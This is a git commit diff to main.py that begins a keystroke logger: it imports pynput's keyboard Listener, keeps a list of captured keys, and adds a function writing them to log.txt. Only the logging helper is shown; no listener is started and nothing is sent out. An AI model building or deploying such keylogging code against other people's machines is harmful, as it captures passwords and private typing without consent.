46d35ffde6d5a27e1f861035e0893532ed60520d
AjayRahul1 <p.ajayrahul02@gmail.com>
2023-08-17 10:15:49 +0530

    function for writing in the file added in code

--- main.py
+++ main.py
@@ -1,1 +1,14 @@
-import os
+import os, pynput
+from pynput.keyboard import Key, Listener
+
+keys = []
+
+def write_file(keys):     
+  with open('log.txt', 'w') as f:
+    for key in keys:
+        # removing ''
+        k = str(key).replace("'", "")
+        f.write(k)      
+        # explicitly adding a space after
+        # every keystroke for readability
+        f.write(' ')
